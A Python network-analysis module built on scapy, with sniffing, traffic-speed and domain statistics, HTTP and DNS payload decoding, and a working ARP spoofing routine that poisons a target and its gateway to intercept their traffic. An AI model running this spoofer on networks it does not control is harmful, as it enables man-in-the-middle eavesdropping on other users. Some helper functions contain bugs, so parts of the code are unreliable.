import time
import scapy.all as sc
import matplotlib.pyplot as plt

from typing import IO, List, Tuple, Any, Optional

# TODO plot with this https://bokeh.org/

class _Analyzer:
    def sniff(target_ip: str = None, target_mac = None, ret_log: bool = True) -> None:
        if ret_log:
            log: IO[str] = open("log_sniff.txt", "w")
        def packet_handler(packet: sc.packet.Packet):
            if target_ip is None and target_mac is None:
                print(packet.summary())
                if ret_log:
                    log.write(f"{packet.summary()}\n----\n")
            elif packet.src == target_mac or packet.dst == target_mac:
                print(packet.summary())
                if ret_log:
                    log.write(f"{packet.summary()}\n----\n")
        try:
            if target_ip is not None:
                sc.sniff(filter=f"host {target_ip}", prn=packet_handler)
            else:
                sc.sniff(prn=packet_handler)
        except KeyboardInterrupt:
            print("quit sniffing")
            exit()

    def speed(target_ip: str = None, target_mac = None, plot: bool = False, nb_iter: int = 100) -> None:
        import numpy as np
        def _speed() -> float:
            tot_bytes: List[int] = []
            start: float = time.time()
            def analyze_packet(packet: sc.packet.Packet) -> None:
                tot_bytes.append(len(packet))
            sc.sniff(count=5, prn=analyze_packet)
            end: float = time.time()
            duration: float = end - start
            speed: float = ((sum(tot_bytes)*8)/duration)/(10**6)
            print(f"speed: {speed} Mbps\nbiggest packet: {max(tot_bytes)} Bytes\nmean = {np.mean(tot_bytes)} Bytes\n--------")
            return speed

        def run() -> None:
            k = 0
            ts: List[float] = [] 
            ss: List[float] = [] 
            while (k < nb_iter):
                if plot:
                    t: float = time.time()
                    s: float = _speed()
                    ts.append(t)
                    ss.append(s)
                    plt.plot(ts, ss, color='black')
                    plt.xlabel("time")
                    plt.ylabel("speed (Mbps)")
                    plt.title("speed = f(t)")
                    plt.pause(0.05)
                    plt.draw()
                else:
                    _speed()
                k += 1
            if plot:
                plt.savefig("speed_vs_time.pdf")
                print("file saved at ./speed_vs_time.pdf")
                plt.show()
        run()

    def domains(plot: bool = False, nb_iter: int = 300, ret: bool = False) -> Optional[List[str]]:
        import socket
        from collections import Counter
        from tqdm import tqdm
        def _domains() -> Counter:
            def analyze_packet(packet: sc.packet.Packet) -> None:
                if packet.haslayer('IP'):
                    ip_src: str = packet['IP'].src
                    ip_dst: str = packet['IP'].dst
                    domain: str = ip_dst if '.' in ip_dst else None

                    if domain:
                        frequent_domains[domain] += 1

            frequent_domains: Counter = Counter()
            sc.sniff(filter="ip", prn=analyze_packet, count=1)
            top_n: int = 10
            most_frequent_domains: List[Tuple[str, int]] = frequent_domains.most_common()
            return frequent_domains

        def run() -> None:
            collected_data: Counter = Counter()
            k: int = 0
            for _ in tqdm(range(nb_iter), desc="Processing", unit="iteration"):
                frequent_domain: Counter = _domains()
                collected_data += frequent_domain
                k+=1

            if plot:
                top_n: int = 10
                most_frequent_domains: List[Tuple[str, int]] = collected_data.most_common(top_n)
                domains, counts = zip(*most_frequent_domains)
                for i in range(len(domains)):
                    try:
                        hostname, _, _ = socket.gethostbyaddr(domains[i])
                        domains[i] = hostname
                    except:
                        pass
                plt.barh(domains, counts)
                plt.xlabel("Access Count")
                plt.ylabel("Domain")
                plt.title("Most Frequent Domains")
                plt.savefig("domains.pdf")
                plt.show()
                print("file saved at ./domains.pdf")
                if ret:
                    return domains

        return run()

    def spoof(target_ip: str) -> None:
        # adapted from https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/ to complete
        import subprocess
        def get_mac(ip) -> str: 
            arp_request = sc.ARP(pdst = ip) 
            broadcast = sc.Ether(dst ="ff:ff:ff:ff:ff:ff") 
            arp_request_broadcast = broadcast / arp_request 
            answered_list = sc.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
            return answered_list[0][1].hwsrc 
          
        def _spoof(target_ip, spoof_ip): 
            packet = sc.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), 
                                                                    psrc = spoof_ip) 
            sc.send(packet, verbose = False) 
          
          
        def restore(destination_ip, source_ip) -> None: 
            destination_mac = get_mac(destination_ip) 
            source_mac = get_mac(source_ip) 
            packet = sc.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
            sc.send(packet, verbose = False) 

        def get_gateway_ip() -> str:
            try:
                result = subprocess.check_output(['route', '-n', 'get', 'default']).decode('utf-8')

                lines = result.split('\n')
                for line in lines:
                    if 'gateway:' in line:
                        gateway_ip = line.split(':')[-1].strip()
                        return gateway_ip
                else:
                    print("Gateway IP not found in the command output.")
            except subprocess.CalledProcessError as e:
                print("Error executing the command:", e)

        gateway_ip = get_gateway_ip()
        print(gateway_ip)
        if not gateway_ip:
            print("Failed to retrieve the gateway IP.")
            exit()
          
        try: 
            sent_packets_count = 0
            while True: 
                _spoof(target_ip, gateway_ip) 
                _spoof(gateway_ip, target_ip) 
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent "+str(sent_packets_count), end ="") 
                time.sleep(2)

          
        except KeyboardInterrupt: 
            print("\nCtrl + C pressed.............Exiting") 
            restore(gateway_ip, target_ip) 
            restore(target_ip, gateway_ip) 
            print("[+] Arp Spoof Stopped") 

    def bandwith(plot: bool = False) -> None:
        time_intervals = [] 
        bandwidth_usage = []
        start_time = time.time()
        def _bandwith() -> None:
            def analyze_packet(pkt):
                global start_time
                now = time.time()
                time_intervals.append(now - start_time)
                bandwidth_usage.append(len(pkt))
                start_time = now
            sc.sniff(prn=analyze_packet, timeout=60)

        def run() -> None:
            _bandwith()
            if plot:
                plt.plot(time_intervals, bandwidth_usage)
                plt.xlabel("Time (seconds)")
                plt.ylabel("Bandwidth Consumption (bytes)")
                plt.title("Bandwidth Consumption Over Time")
                plt.grid(True)
                plt.show()
        run()

    def decode(log: bool = False) -> None:
        if log:
            log_file: IO[str] = open("log_decode.txt", "w")
        def decode_http(packet: sc.packet.Packet) -> None:
            if packet.haslayer(sc.Raw):
                try:
                    http_data = packet[sc.Raw].load.decode('utf-8', 'ignore')
                    http_lines = http_data.split("\r\n\r\n")
                    if http_lines and 'HTTP' in http_lines[0]:
                        http_header, http_body = http_lines[0].split("\r\n", 1)
                        print(f"HTTP Request/Response: {http_header.split()[0]}\n---")
                        print(f"HTTP Headers\n{http_header}\n---")
                        print(f"HTTP Body\n{http_body}\n------------")
                        if log:
                            log_file.write(f"HTTP Request/Response: {http_header.split()[0]}\n---\nHTTP Headers\n{http_header}\n---\nHTTP Body\n{http_body}\n------------\n")
                except:
                    pass
        
        def decode_dns(packet: sc.packet.Packet):
            try:
                if packet.haslayer(sc.DNS):
                    dns_data = packet[sc.DNS]
                    print("DNS Packet:")
                    print(f"Source IP: {packet[sc.IP].src}")
                    print(f"Destination IP: {packet[sc.IP].dst}")

                    if dns_data.qd:
                        print("DNS Questions:")
                        for question in dns_data.qd:
                            qname = question.qname.decode('utf-8', 'ignore')
                            qtype = question.qtype
                            qclass = question.qclass
                            print(f"  - Name: {qname}")
                            print(f"    Type: {qtype}  Class: {qclass}")

                    if dns_data.an:
                        print("DNS Answers:")
                        for answer in dns_data.an:
                            name = answer.rrname.decode('utf-8', 'ignore')
                            rtype = answer.type
                            rclass = answer.rclass
                            rdata = answer.rdata.decode('utf-8', 'ignore')
                            print(f"  - Name: {name}")
                            print(f"    Type: {rtype}  Class: {rclass}")
                            print(f"    Data: {rdata}")

                    if dns_data.ns:
                        print("DNS Authoritative Servers:")
                        for ns in dns_data.ns:
                            nsname = ns.rrname.decode('utf-8', 'ignore')
                            nstype = ns.type
                            nsclass = ns.rclass
                            nsdata = ns.rdata.decode('utf-8', 'ignore')
                            print(f"  - Name: {nsname}")
                            print(f"    Type: {nstype}  Class: {nsclass}")
                            print(f"    Data: {nsdata}")

                    qr_flag = dns_data.qr
                    aa_flag = dns_data.aa
                    tc_flag = dns_data.tc
                    rd_flag = dns_data.rd
                    ra_flag = dns_data.ra
                    ad_flag = dns_data.ad
                    cd_flag = dns_data.cd
                    print("DNS Response Flags:")
                    print(f"QR (Query/Response): {qr_flag}")
                    print(f"AA (Authoritative Answer): {aa_flag}")
                    print(f"TC (Truncated): {tc_flag}")
                    print(f"RD (Recursion Desired): {rd_flag}")
                    print(f"RA (Recursion Available): {ra_flag}")
                    print(f"AD (Authenticated Data): {ad_flag}")
                    print(f"CD (Checking Disabled): {cd_flag}")
            except:
                pass

        def analyze_packet(packet: sc.packet.Packet):
                decode_dns(packet)
                decode_http(packet)

        sc.sniff(filter="tcp or udp", prn=analyze_packet)

    def most_used():
        from collections import Counter
        packet_counts = Counter()
        tot_pack = 0
        def packet_callback(packet):
            iface = packet.sniffed_on
            tot_pack += 1
            packet_counts[iface] += 1
        sc.sniff(prn=packet_callback)
        most_used_iface = packet_counts.most_common(3)[0]
        print(f"The most used interface is: {most_used_iface} {tot_pack}")

Analyzer = _Analyzer

if __name__ == "__main__":
    Analyzer.most_used()
